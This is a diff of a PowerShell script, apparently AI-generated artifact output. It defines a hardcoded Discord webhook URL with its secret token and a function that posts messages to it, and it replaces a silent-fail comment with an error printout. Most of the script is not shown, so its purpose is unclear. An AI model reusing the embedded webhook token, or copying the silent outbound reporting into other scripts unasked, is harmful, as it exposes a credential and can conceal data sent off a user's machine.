@@ -1,3 +1,4 @@
+$xaiArtifact artifact_id="b7e3f4a2-8b9c-4d5e-9f2a-7c8d3e5f6a7b" title="script.ps1" contentType="text/powershell"
 $webhookUrl = 'https://discord.com/api/webhooks/1411023027860410490/tX-RGpPD7WxrwbTmOcDaU8BZG-2-FDfJsvMi9DXF2Dc57h1WJQMVReBZ-RF2AnmPV095'
 
 # Function to send message to webhook
@@ -7,7 +8,7 @@ function Send-WebhookMessage {
     try {
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json' -ErrorAction Stop | Out-Null
     } catch {
-        # Silent fail for webhook errors
+        Write-Output "Failed to send webhook message: $_"
     }
 }
 
@@ -136,3 +137,4 @@ try {
 } catch {
     Send-WebhookMessage -Message "Unexpected error: $_"
 }
+$xaiArtifact
